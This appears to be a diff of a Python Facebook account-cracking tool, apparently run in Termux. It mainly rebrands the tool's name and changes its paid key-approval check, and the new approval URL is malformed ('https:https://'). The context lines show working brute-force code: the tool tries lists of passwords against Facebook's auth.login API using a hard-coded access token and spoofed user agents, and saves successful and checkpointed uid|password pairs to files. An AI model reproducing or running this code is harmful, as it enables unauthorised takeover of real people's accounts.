@@ -1263,7 +1263,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ SዙAӃꀤŁ ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ Rahat ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1280,15 +1280,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ SዙAӃꀤŁ-OK ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ Rahat-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SዙAӃꀤŁ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Rahat-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ shakil-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SዙAӃꀤŁ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Rahat-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1300,7 +1300,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrSM MEGHLA-cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/riajahmedrahat/rahat-approval.txt/tree/main").text
+	r1=requests.get("https:https://github.com/riajahmedrahat/rahat-approval.txt/blob/main/rahat-approval.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -1313,7 +1313,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m SዙAӃꀤŁ Tool Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Rahat Tool Paid You Need Get Approved First\033[1;37m\n")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
